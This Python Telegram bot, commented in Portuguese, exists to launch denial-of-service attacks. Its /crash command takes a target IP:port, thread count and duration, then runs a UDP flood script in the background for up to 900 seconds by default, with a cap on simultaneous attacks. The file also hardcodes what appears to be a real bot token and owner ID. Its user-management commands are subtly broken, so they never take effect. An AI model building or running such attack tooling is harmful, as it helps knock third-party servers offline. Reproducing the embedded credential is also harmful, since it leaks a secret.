import telebot
import subprocess
import re
import time
from threading import Thread
import os

BOT_TOKEN = "7972626459:AAGjV9QjaDRfEYXOO-X4TgXoWo2MqQbwMz8"
SEU_ID_TELEGRAM = 6430703027
bot = telebot.TeleBot(BOT_TOKEN)
processos = {}
authorized_users = [SEU_ID_TELEGRAM]  # Lista de usuarios autorizados
MAX_ATTACKS = 3  # Limite de ataques simultaneos

# Função para validar o formato de IP e Porta
def validar_ip_porta(ip_porta):
    padrao = r'^\d{1,3}(\.\d{1,3}){3}:\d+$'
    match = re.match(padrao, ip_porta)
    return match is not None

# Função para executar o comando do ataque
def executar_comando(ip_porta, threads, tempo):
    comando_terminal = f"python start.py UDP {ip_porta} {threads} {tempo}"
    try:
        processo = subprocess.Popen(
            comando_terminal, 
            shell=True, 
            cwd=os.path.dirname(os.path.abspath(__file__)),  # Define o diretorio atual do bot
            stdout=subprocess.PIPE, 
            stderr=subprocess.PIPE
        )
        processos[ip_porta] = processo
        time.sleep(int(tempo))  # Aguarda o tempo do ataque
        processo.terminate()  # Termina o processo apos o tempo especificado
        del processos[ip_porta]  # Remove o processo da lista
    except Exception as e:
        print(f"Erro ao executar o comando: {str(e)}")

# Funcao para gerenciar o limite de ataques simultâneos
def manage_attacks():
    if len(processos) >= MAX_ATTACKS:
        oldest_process = list(processos.values())[0]  # Pega o primeiro processo
        oldest_process.terminate()  # Termina o processo mais antigo
        del processos[list(processos.keys())[0]]  # Remove da lista de processos

# Comando /start
@bot.message_handler(commands=['start'])
def start_message(message):
    welcome_text = (
        "Bem-vindo ao bot! \n\n"
        "Aqui estão os comandos disponíveis para você:\n\n"
        "Comandos básicos:\n"
        "/crash <IP:PORTA> <threads> <tempo> - Envia um ataque ao IP especificado.\n"
        "/meuid - Mostra seu ID de usuário.\n\n"
        "Comandos para usuários autorizados:\n"
        "/adduser <ID> - Adiciona um usuário autorizado.\n"
        "/removeuser <ID> - Remove um usuário autorizado.\n\n"
        "Entre em contato se precisar de ajuda! "
    )
    bot.send_message(message.chat.id, welcome_text)

# Comando /crash
@bot.message_handler(commands=['crash'])
def crash_server(message):
    if message.from_user.id != SEU_ID_TELEGRAM:
        bot.send_message(message.chat.id, "Acesso negado.")
        return

    comando = message.text.split()
    if len(comando) < 2:
        bot.send_message(message.chat.id, "Uso correto: /crash <IP:PORTA> <threads> <tempo>")
        return

    ip_porta = comando[1]
    threads = '10'  # Valor padrao de threads
    tempo = '900'  # Valor padrao de tempo

    # Se o usuario enviar o IP com o tempo
    if len(comando) == 3:
        tempo = comando[2]  # Ajusta o tempo se o usuario passar o tempo
    elif len(comando) == 4:
        threads = comando[2]  # Ajusta as threads se o usuario passar os parâmetros corretos
        tempo = comando[3]

    # Verificar se ja existe um processo em andamento para o mesmo IP
    if ip_porta in processos:
        bot.send_message(message.chat.id, f"Já existe um ataque em andamento para {ip_porta}. Tente novamente mais tarde.")
        return

    if not validar_ip_porta(ip_porta):
        bot.send_message(message.chat.id, "Formato de IP:PORTA inválido.")
        return

    # Gerenciar o limite de ataques simultaneos
    manage_attacks()

    # Notificar que o ataque vai começar
    bot.send_message(message.chat.id, f"Iniciando o ataque para {ip_porta} com {threads} threads por {tempo} segundos...")

    # Iniciar o ataque em uma nova thread
    thread = Thread(target=executar_comando, args=(ip_porta, threads, tempo))
    thread.start()

# Comando /meuid
@bot.message_handler(commands=['meuid'])
def send_user_id(message):
    bot.send_message(message.chat.id, f"Seu ID de usuário é: {message.from_user.id}")

# Comandos de administracao (somente o dono pode usar)
@bot.message_handler(commands=['adduser', 'removeuser'])
def admin_commands(message):
    if message.from_user.id != SEU_ID_TELEGRAM:
        bot.send_message(message.chat.id, "Acesso negado.")
        return

    comando = message.text.split()
    if len(comando) != 2:
        bot.send_message(message.chat.id, "Uso correto: /adduser <ID>, /removeuser <ID>")
        return

    usuario_id = int(comando[1])

    if comando[0] == "adduser":
        if usuario_id not in authorized_users:
            authorized_users.append(usuario_id)
            bot.send_message(message.chat.id, f"Usuário {usuario_id} adicionado com sucesso.")
        else:
            bot.send_message(message.chat.id, "Usuário já autorizado.")
    
    elif comando[0] == "removeuser":
        if usuario_id in authorized_users:
            authorized_users.remove(usuario_id)
            bot.send_message(message.chat.id, f"Usuário {usuario_id} removido com sucesso.")
        else:
            bot.send_message(message.chat.id, "Usuário não encontrado.")

# Funcao para manter o bot ativo (reconectar automaticamente em caso de falhas)
def keep_alive():
    while True:
        try:
            bot.polling(timeout=60)
        except Exception as e:
            print(f"Erro no bot: {e}")
            time.sleep(15)  # Espera 15 segundos antes de tentar reconectar

# Iniciar o bot em uma thread separada para manter ele ativo
if __name__ == "__main__":
    keep_alive()